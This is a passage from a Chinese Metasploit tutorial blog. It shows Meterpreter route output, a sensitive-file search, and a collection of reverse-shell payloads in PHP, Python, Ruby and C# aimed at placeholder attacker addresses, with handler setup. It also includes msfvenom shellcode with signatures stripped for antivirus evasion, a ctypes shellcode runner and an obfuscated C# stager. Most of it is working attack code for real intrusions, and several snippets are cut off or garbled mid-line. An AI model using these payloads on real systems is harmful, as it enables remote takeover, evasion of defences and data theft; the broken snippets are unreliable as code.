dapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Route<span class="token punctuation">:</span><span class="token number">0x000055aee789a7b0</span> @subnet<span class="token operator">=</span><span class="token string">"127.0.0.0"</span><span class="token punctuation">,</span> @netmask<span class="token operator">=</span><span class="token string">"255.0.0.0"</span><span class="token punctuation">,</span> @gateway<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> @interface<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> @metric<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> #<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Route<span class="token punctuation">:</span><span class="token number">0x000055aee78993b0</span> \@subnet<span class="token operator">=</span><span class="token string">"192.168.1.0"</span><span class="token punctuation">,</span> @netmask<span class="token operator">=</span><span class="token string">"255.255.255.0"</span><span class="token punctuation">,</span> @gateway<span class="token operator">=</span><span class="token string">"192.168.1.119"</span><span class="token punctuation">,</span> @interface<span class="token operator">=</span><span class="token string">"65539"</span><span class="token punctuation">,</span> @metric<span class="token operator">=</span><span class="token number">10</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> #<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Route<span class="token punctuation">:</span><span class="token number">0x000055aee786fec0</span> @subnet<span class="token operator">=</span><span class="token string">"192.168.1.119"</span><span class="token punctuation">,</span> @netmask<span class="token operator">=</span><span class="token string">"255.255.255.255"</span><span class="token punctuation">,</span> @gateway<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> @interface<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> @metric<span class="token operator">=</span><span class="token number">10</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>#<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Route<span class="token punctuation">:</span><span class="token number">0x000055aee786e9d0</span> @subnet<span class="token operator">=</span><span class="token string">"192.168.1.255"</span><span class="token punctuation">,</span> @netmask<span class="token operator">=</span><span class="token string">"255.255.255.255"</span><span class="token punctuation">,</span> @gateway<span class="token operator">=</span><span class="token string">"192.168.1.119"</span><span class="token punctuation">,</span> @inte
rface<span class="token operator">=</span><span class="token string">"65539"</span><span class="token punctuation">,</span> @metric<span class="token operator">=</span><span class="token number">10</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> #<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Route<span class="token punctuation">:</span><span class="token number">0x000055aee786d698</span> @subnet<span class="token operator">=</span><span class="token string">"224.0.0.0"</span><span class="token punctuation">,</span> @netmask<span class="token operator">=</span><span class="token string">"240.0.0.0"</span><span class="token punctuation">,</span> @gateway<span class="token operator">=</span><span class="token string">"192.168.1.119"</span><span class="token punctuation">,</span> @interface<span class="token operator">=</span><span class="token string">"65539"</span><span class="token punctuation">,</span> @metric<span class="token operator">=</span><span class="token number">10</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>#<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Route<span class="token punctuation">:</span><span class="token number">0x000055aee785be98</span> @subnet<span class="token operator">=</span><span class="token string">"255.255.255.255"</span><span class="token punctuation">,</span> @netmask<span class="token operator">=</span><span class="token string">"255.255.255.255"</span><span class="token punctuation">,</span> @gateway<span class="token operator">=</span><span class="token string">"192.168.1.119"</span><span class="token punctuation">,</span>
@interface<span class="token operator">=</span><span class="token string">"65539"</span><span class="token punctuation">,</span> @metric<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">]</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220748670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>实战中的敏感文件操作，也是目前最稳定，速度最快的方式：</strong></p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token string">"C:\\"</span><span class="token punctuation">,</span> <span class="token string">"*.txt"</span><span class="token punctuation">)</span>
</code></pre>
<p>更多的敏感文件操作，后续补充。<br>
<img src="https://img-blog.csdnimg.cn/20201008220806318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
更多相关的api操作在未来的课时中介绍。</p>
<hr>
<h2><a id="106__payload_3275"></a>10.6 基于第十课补充 payload（一）</h2>
<p>在实战中可能会遇到各种诉求 payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。</p>
<p>这次主要补充了 PHP，python，ruby。</p>
<p>ps:在线代码高亮：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>tool<span class="token punctuation">.</span>oschina<span class="token punctuation">.</span>net<span class="token operator">/</span>highlight
</code></pre>
<p><strong>1、php-payload</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.107</span>
LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.107</span>
</code></pre>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>
php <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>; $ip <span class="token operator">=</span> <span class="token string">'x.x.x.x'</span>; $port <span class="token operator">=</span> <span class="token number">53</span>; <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>$f <span class="token operator">=</span> <span class="token string">'stream_socket_client'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">{</span>$port<span class="token punctuation">}</span>"<span class="token punctuation">)</span>; $s_type <span class="token operator">=</span> <span class="token string">'stream'</span>; <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>$s <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>$f <span class="token operator">=</span> <span class="token string">'fsockopen'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> $s <span class="token operator">=</span> $<span class="token function">f</span><span class="token punctuation">(</span>$ip<span class="token punctuation">,</span> $port<span class="token punctuation">)</span>; $s_
<span class="token function">strlen</span><span class="token punctuation">(</span>$b<span class="token punctuation">)</span><span class="token punctuation">)</span>; <span class="token keyword">break</span>; <span class="token keyword">case</span> <span class="token string">'socket'</span><span class="token punctuation">:</span> $b <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span>$s<span class="token punctuation">,</span> $len<span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span>$b<span class="token punctuation">)</span><span class="token punctuation">)</span>; <span class="token keyword">break</span>; <span class="token punctuation">}</span> <span class="token punctuation">}</span> $GLOBALS<span class="token punctuation">[</span><span class="token string">'msgsock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> $s;
$GLOBALS<span class="token punctuation">[</span><span class="token string">'msgsock_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> $s_type; <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span>'s
<span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162104264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>php
$sock<span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span>;<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span><span class="token punctuation">)</span>;
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162119964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>2、python-payload</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.107</span>
LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.107</span>
</code></pre>
<pre><code class="prism language-c">import socket<span class="token punctuation">,</span><span class="token keyword">struct</span><span class="token punctuation">,</span>time
<span class="token keyword">for</span> x in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    try<span class="token punctuation">:</span>
        s<span class="token operator">=</span>socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'x.x.x.x'</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    except<span class="token punctuation">:</span>
        time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> l<span class="token operator">=</span><span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&gt;I'</span><span class="token punctuation">,</span>s<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
d<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token function">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token operator">&lt;</span>l<span class="token punctuation">:</span>
    d<span class="token operator">+</span><span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span>l<span class="token operator">-</span><span class="token function">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">exec</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">'s'</span><span class="token punctuation">:</span>s<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100916214876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">import socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os;
s<span class="token operator">=</span>socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>;s<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>;
i"<span class="token punctuation">]</span><span class="token punctuation">)</span>;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162206114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">import socket import subprocess
s<span class="token operator">=</span>socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
  p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span><span class="token function">Popen</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                      shell<span class="token operator">=</span>True<span class="token punctuation">,</span>
                      <span class="token constant">stdout</span><span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
                      <span class="token constant">stderr</span><span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
                      <span class="token constant">stdin</span><span class="token operator">=</span>subprocess<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token constant">stdout</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">.</span><span class="token constant">stderr</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                      <span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162219427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>删除特征：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">8.8</span><span class="token number">.8</span><span class="token number">.8</span> LPORT<span class="token operator">=</span><span class="token number">88</span> <span class="token operator">-</span>f c <span class="token operator">|</span> tr <span class="token operator">-</span>d <span class="token string">'"'</span> <span class="token operator">|</span> tr <span class="token operator">-</span>d <span class="token string">'\n'</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/202010091622400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">from ctypes import <span class="token operator">*</span>

reverse_shell <span class="token operator">=</span> "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72
micropoorshell <span class="token operator">=</span> <span class="token function">create_string_buffer</span><span class="token punctuation">(</span>reverse_shell<span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>reverse_shell<span class="token punctuation">)</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token function">cast</span><span class="token punctuation">(</span>micropoorshell<span class="token punctuation">,</span> <span class="token function">CFUNCTYPE</span><span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">shellcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><strong>3、ruby-payload</strong></p>
<pre><code class="prism language-c">require <span class="token string">'socket'</span>;c<span class="token operator">=</span>TCPSocket<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>;$<span class="token constant">stdin</span><span class="token punctuation">.</span><span class="token function">reopen</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>;$<span class="token constant">stdout</span><span class="token punctuation">.</span><span class="token function">reopen</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>;$<span class="token constant">stderr</span><span class="token punctuation">.</span><span class="token function">reopen</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>;$stdi
<span class="token punctuation">(</span>IO<span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">|</span>fd<span class="token operator">|</span> fd<span class="token punctuation">.</span>each_line <span class="token punctuation">{</span><span class="token operator">|</span>o<span class="token operator">|</span> c<span class="token punctuation">.</span><span class="token function">puts</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>strip<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span> rescue nil<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162343921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">require <span class="token string">'socket'</span>;f<span class="token operator">=</span>TCPSocket<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">.</span>to_i;exec <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"</span><span class="token punctuation">,</span>f<span class="token punctuation">,</span>f<span class="token punctuation">,</span>f<span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162357197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">require <span class="token string">'socket'</span>;c<span class="token operator">=</span>TCPSocket<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span><span class="token string">"xx"</span><span class="token punctuation">)</span>;<span class="token keyword">while</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span>c<span class="token punctuation">.</span>gets<span class="token punctuation">)</span>;IO<span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">|</span>io<span class="token operator">|</span>c<span class="token punctuation">.</span>print io<span class="token punctuation">.</span>read<span class="token punctuation">}</span>end
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100916241045.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">c<span class="token operator">=</span>TCPSocket<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span><span class="token string">"xx"</span><span class="token punctuation">)</span>;<span class="token keyword">while</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span>c<span class="token punctuation">.</span>gets<span class="token punctuation">)</span>;IO<span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\<span class="token operator">|</span>io\<span class="token operator">|</span>c<span class="token punctuation">.</span>print
io<span class="token punctuation">.</span>read<span class="token punctuation">}</span>end
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162422580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="107_payload_3397"></a>10.7 基于第十课补充payload（二）</h2>
<p>在实战中可能会遇到各种诉求 payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。</p>
<p>这次主要补充了 C#，Bash</p>
<p>ps:在线代码高亮：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>tool<span class="token punctuation">.</span>oschina<span class="token punctuation">.</span>net<span class="token operator">/</span>highlight
</code></pre>
<p><strong>1、C#-payload</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp 
payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.107</span>
LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.107</span>
</code></pre>
<p><strong>混淆：</strong></p>
<pre><code class="prism language-c">using System; using System<span class="token punctuation">.</span>Net; using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets; using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices; using System<span class="token punctuation">.</span>
namespace RkfCHtll <span class="token punctuation">{</span> class LiNGeDokqnEH <span class="token punctuation">{</span>
<span class="token keyword">static</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">idCWVw</span><span class="token punctuation">(</span>string VVUUJUQytjlL<span class="token punctuation">,</span> <span class="token keyword">int</span> eMcukOUqFuHbUv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    IPEndPoint nlttgWAMdEQgAo <span class="token operator">=</span> new <span class="token function">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>VVUUJUQytjlL<span class="token punctuation">)</span><span class="token punctuation">,</span>
eMcukOUqFuHbUv<span class="token punctuation">)</span>; 
    Socket fzTiwdk <span class="token operator">=</span> new <span class="token function">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span>
SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span>; 
    try <span class="token punctuation">{</span> fzTiwdk<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>nlttgWAMdEQgAo<span class="token punctuation">)</span>;<span class="token punctuation">}</span>
    catch <span class="token punctuation">{</span> <span class="token keyword">return</span> null;<span class="token punctuation">}</span>
    byte<span class="token punctuation">[</span><span class="token punctuation">]</span> gJVVagJmu <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>;
    fzTiwdk<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>gJVVagJmu<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>;
    <span class="token keyword">int</span> GFxHorfhzft <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>gJVVagJmu<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>;
    byte<span class="token punctuation">[</span><span class="token punctuation">]</span> mwxyRsYNn <span class="token operator">=</span> new byte<span class="token punctuation">[</span>GFxHorfhzft <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span>; 
    <span class="token keyword">int</span> yVcZAEmXaMszAc <span class="token operator">=</span> <span class="token number">0</span>;
    <span class="token keyword">while</span> <span class="token punctuation">(</span>yVcZAEmXaMszAc <span class="token operator">&lt;</span> GFxHorfhzft<span class="token punctuation">)</span>
    <span class="token punctuation">{</span> yVcZAEmXaMszAc <span class="token operator">+</span><span class="token operator">=</span> fzTiwdk<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>mwxyRsYNn<span class="token punctuation">,</span>yVcZAEmXaMszAc <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>GFxHorfhzft <span class="token operator">-</span> yVcZAEmXaMszAc<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span> 
    byte<span class="token punctuation">[</span><span class="token punctuation">]</span> XEvFDc <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>fzTiwdk<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span>;
    Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>XEvFDc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> mwxyRsYNn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>; mwxyRsYNn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span>;
